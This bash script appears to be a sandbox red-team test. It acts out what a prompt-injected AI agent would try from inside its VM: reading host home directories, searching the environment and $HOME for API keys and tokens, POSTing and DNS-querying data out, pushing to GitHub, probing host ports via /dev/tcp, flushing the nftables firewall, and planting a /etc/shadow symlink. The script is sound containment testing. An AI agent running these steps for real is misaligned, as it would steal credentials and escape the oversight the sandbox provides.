#!/usr/bin/env bash
# The adversary: what a prompt-injected agent would try, in the order it would try
# it. Runs inside the guest as `agent`.
#
# This is not a gate. A gate proves a property holds; this assumes it does not and
# goes looking for a way through. Every attempt must be blocked, and the evidence for
# each is the line it prints — that transcript is the deliverable, and it is what an
# ADR can cite.
#
# Each attempt reports one of:
#   BLOCKED  the attack failed; the evidence says how it was stopped
#   ESCAPED  the attack succeeded; the run fails
#   SKIP     there was nothing to attack (the reason says what was missing)
set -uo pipefail

# Run as the account the fleet uses. As root every privilege attempt would trivially
# "succeed" and the transcript would prove the opposite of what it claims.
if [[ "$(id -un)" != agent ]]; then
  echo "redteam: run as the agent user, not $(id -un)" >&2
  exit 2
fi

gateway=$(ip -4 route show default | awk '{print $3; exit}')
proxy="http://${gateway}:3128"
workspace=${CREW_WORKSPACE:-}
repos=${CREW_REDTEAM_REPOS:-}
# A real repository this guest can name when the operator supplies neither a list
# nor a workspace with an origin. The project repo is public, so an unauthenticated
# push reaches GitHub and is refused; a leaked credential is what the attack looks
# for.
default_repo=${CREW_REDTEAM_DEFAULT_REPO:-aditya-sathish-rao/crew-sandbox}

# workspace_repo prints owner/name from the mounted workspace's origin, if it has
# one. The workspace is read-only, which is enough: this only reads the remote URL.
workspace_repo() {
  [[ -n "$workspace" ]] || return 0
  git -C "$workspace" rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 0
  local url
  url=$(git -C "$workspace" remote get-url origin 2>/dev/null) || return 0
  url=$(printf '%s' "$url" | sed -E 's#^https://[^@/]+@#https://#')
  case "$url" in
    https://github.com/*) url=${url#https://github.com/} ;;
    git@github.com:*) url=${url#git@github.com:} ;;
    *) return 0 ;;
  esac
  printf '%s\n' "${url%.git}"
}

total=0
blocked=0
escaped=0

# record <verdict> <attempt> <evidence>: one line per attempt, and the only place
# the counts change. Evidence never contains a secret value, only where it was found:
# a transcript that quoted the key would be the leak it is meant to rule out.
record() {
  printf '%-8s %-21s %s\n' "$1" "$2" "$3"
  total=$((total + 1))
  case "$1" in
    BLOCKED) blocked=$((blocked + 1)) ;;
    ESCAPED) escaped=$((escaped + 1)) ;;
  esac
}

printf 'redteam %s on %s as %s\n' "$(date -Is)" "$(hostname)" "$(id -un)"

# 1. Read the host's filesystem, which is the thing the VM exists to prevent.
read_host_home() {
  local path read="" present=""
  for path in /Users /home/crew /root; do
    [[ -e "$path" ]] || continue
    if ls "$path" >/dev/null 2>&1; then
      read="$read $path"
    else
      present="$present $path"
    fi
  done
  if [[ -n "$read" ]]; then
    record ESCAPED read-host-home "listed${read}"
  elif [[ -n "$present" ]]; then
    record BLOCKED read-host-home "no host home in the guest; unreadable:${present}"
  else
    record BLOCKED read-host-home "no host home in the guest"
  fi
}

# 2. Find a real credential. Values are never printed; a name is enough to fail on.
find_a_key() {
  local line name value found=""
  while IFS= read -r line; do
    name=${line%%=*}
    value=${line#*=}
    case "$value" in
      sk-* | ghp_* | ghs_* | ghu_* | github_pat_* | -----BEGIN*) found="$found env:$name" ;;
    esac
  done < <(env)
  for path in "$HOME/.ssh" "$HOME/.config/gh" "$HOME/.netrc" "$HOME/.aws" "$HOME/.npmrc"; do
    [[ -r "$path" ]] && found="$found $path"
  done
  # The one credential the guest is supposed to have. It authorises this guest to
  # the host gateway and to nothing else, so a model key here is an escape.
  if [[ -r /etc/crew-model-token ]] && [[ "$(cat /etc/crew-model-token)" == sk-* ]]; then
    found="$found /etc/crew-model-token(a model key)"
  fi
  if [[ -n "$found" ]]; then
    record ESCAPED find-a-key "found${found}"
  else
    record BLOCKED find-a-key "no key-shaped value in the environment, no key store in \$HOME, and the guest token is not a key"
  fi
}

# 3. Send data out. Both routes are tried: around the proxy, and through the one door
# the firewall opens, which must still refuse a host it does not name. DNS is a third
# channel entirely and is the one a firewall over TCP alone would miss.
exfiltrate() {
  local evidence
  if curl --noproxy '*' -sS -m 5 -o /dev/null -d 'crew-redteam' https://example.com/ 2>/dev/null; then
    record ESCAPED exfiltrate "posted to example.com without the proxy"
    return
  fi
  evidence="direct POST refused"
  if curl -sS -m 8 -o /dev/null -x "$proxy" -d 'crew-redteam' https://example.com/ 2>/dev/null; then
    record ESCAPED exfiltrate "posted to example.com through the proxy"
    return
  fi
  evidence="$evidence; the proxy refused example.com"
  if dig +time=2 +tries=1 @1.1.1.1 "crew-redteam-$$.example.com" A 2>/dev/null | grep -q 'ANSWER SECTION'; then
    record ESCAPED exfiltrate "an external resolver answered a query"
    return
  fi
  record BLOCKED exfiltrate "$evidence; no resolver answers"
}

# 4. Use a credential against GitHub. The API host is on the allowlist on purpose,
# so the route is open and there is still no token to spend. The same attempt is
# aimed at a real repository: the workspace's origin, the operator's list, or the
# project repo. A push that fails for lack of a credential is the point; one that
# succeeds is the escape.
push() {
  local code evidence="" target ref out rc tmp targets
  code=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' -x "$proxy" \
    -H 'Authorization: token none' https://api.github.com/installation/repositories 2>/dev/null) || code=000
  if [[ "$code" == 200 ]]; then
    record ESCAPED push-to-github "the GitHub API accepted a token the guest invented (${code})"
    return
  fi
  evidence="api.github.com refuses the guest (${code})"

  targets=$repos
  if [[ -z "$targets" ]]; then targets=$(workspace_repo); fi
  if [[ -z "$targets" ]]; then targets=$default_repo; fi

  for target in $targets; do
    code=$(curl -sS -m 10 -o /dev/null -w '%{http_code}' -x "$proxy" \
      -X PUT -H 'content-type: application/json' \
      -d '{"message":"redteam probe","content":"cmVkdGVhbQ==","branch":"main"}' \
      "https://api.github.com/repos/${target}/contents/redteam-$$.txt" 2>/dev/null) || code=000
    case "$code" in
      200 | 201)
        record ESCAPED push-to-github "wrote to ${target} (${code})"
        return
        ;;
    esac
    evidence="$evidence; ${target} refused the API write (${code})"
  done

  target=${targets%% *}
  if ! command -v git >/dev/null 2>&1; then
    record SKIP push-to-github "${evidence}; no git in the guest to attempt a push"
    return
  fi

  tmp=$(mktemp -d)
  if ! git -C "$tmp" init -q 2>/dev/null ||
    ! git -C "$tmp" -c user.email=redteam@example.invalid -c user.name=redteam \
      commit -q --allow-empty -m "redteam probe" 2>/dev/null; then
    rm -rf "$tmp"
    record SKIP push-to-github "${evidence}; could not build a throwaway commit"
    return
  fi

  ref="refs/heads/crew-redteam-probe-$$"
  out=$(GIT_TERMINAL_PROMPT=0 GIT_ASKPASS=/bin/false \
    https_proxy="$proxy" http_proxy="$proxy" HTTPS_PROXY="$proxy" HTTP_PROXY="$proxy" \
    timeout 30 git -C "$tmp" push "https://github.com/${target}.git" "HEAD:${ref}" 2>&1)
  rc=$?
  if [[ "$rc" -eq 0 ]]; then
    # The push worked, so a credential the guest should not have was usable. Remove
    # the evidence branch with the same credential and report the escape either way.
    GIT_TERMINAL_PROMPT=0 GIT_ASKPASS=/bin/false \
      https_proxy="$proxy" http_proxy="$proxy" HTTPS_PROXY="$proxy" HTTP_PROXY="$proxy" \
      timeout 30 git -C "$tmp" push "https://github.com/${target}.git" \
      --delete "${ref#refs/heads/}" >/dev/null 2>&1 || true
    rm -rf "$tmp"
    record ESCAPED push-to-github "pushed ${ref} to ${target}"
    return
  fi
  rm -rf "$tmp"

  # Keep the transcript one line and free of anything credential-shaped.
  out=$(printf '%s' "$out" | tr '\n' ' ' |
    sed -E 's#https://[^ ]*@#https://***@#g' | cut -c1-180)
  case "$out" in
    *"could not read Username"* | *"Authentication failed"* | *"403"* | *"401"*)
      evidence="$evidence; the push reached GitHub and was refused (${out})"
      ;;
    *"CONNECT"* | *"proxy"* | *"onnection refused"*)
      evidence="$evidence; the proxy refused the push (${out})"
      ;;
    *)
      evidence="$evidence; the push did not leave the guest (${out})"
      ;;
  esac
  record BLOCKED push-to-github "$evidence"
}

# 5. Reach the host's own services. The proxy and model-gateway ports are not in the
# list because they are the way out by design; everything else is a service the
# operator runs.
reach_host_services() {
  local port open=""
  for port in 22 80 3000 3129 5432 8080 8888; do
    if timeout 2 bash -c ": >/dev/tcp/${gateway}/${port}" 2>/dev/null; then
      open="$open $port"
    fi
  done
  if [[ -n "$open" ]]; then
    record ESCAPED reach-host-services "connected to${open} on ${gateway}"
  else
    record BLOCKED reach-host-services "nothing on ${gateway} accepts a connection except the proxy and model-gateway ports"
  fi
}

# 6. Escalate. The firewall is the only thing between the guest and the network, so
# being able to flush it is the same as having no firewall.
escalate() {
  local evidence
  if sudo -n true 2>/dev/null; then
    record ESCAPED escalate "sudo succeeded"
    return
  fi
  evidence="sudo refused"
  if nft flush ruleset 2>/dev/null; then
    record ESCAPED escalate "flushed the firewall ruleset"
    return
  fi
  evidence="$evidence; the ruleset cannot be flushed"
  if [[ -w /etc/nftables.conf ]]; then
    record ESCAPED escalate "the ruleset file is writable"
    return
  fi
  record BLOCKED escalate "$evidence; the ruleset file is not writable"
}

# 7. Plant something the host might later act on: a git hook, or a symlink that
# redirects a later write outside the guest. The guest can only prove the planting
# half — that a write into the mounted directory fails. The other half, that nothing
# on the host reads the workspace, is a property of the host-side design and is not
# observable from in here.
plant_in_workspace() {
  if [[ -z "$workspace" ]]; then
    record SKIP plant-in-workspace "no workspace is mounted"
    return
  fi
  if [[ ! -d "$workspace" ]]; then
    record SKIP plant-in-workspace "${workspace} is not mounted in this guest"
    return
  fi
  if ( : >"${workspace}/.crew-redteam-probe" ) 2>/dev/null; then
    rm -f "${workspace}/.crew-redteam-probe" 2>/dev/null
    record ESCAPED plant-in-workspace "created a file in ${workspace}"
    return
  fi
  if ln -s /etc/shadow "${workspace}/.crew-redteam-link" 2>/dev/null; then
    record ESCAPED plant-in-workspace "created a symlink in ${workspace}"
    return
  fi
  record BLOCKED plant-in-workspace "the workspace is read-only, so no file and no symlink could be planted"
}

read_host_home
find_a_key
exfiltrate
push
reach_host_services
escalate
plant_in_workspace

printf '\nredteam: %d/%d blocked\n' "$blocked" "$total"
if [[ "$escaped" -ne 0 ]]; then
  printf 'redteam: %d escaped\n' "$escaped" >&2
  exit 1
fi
exit 0
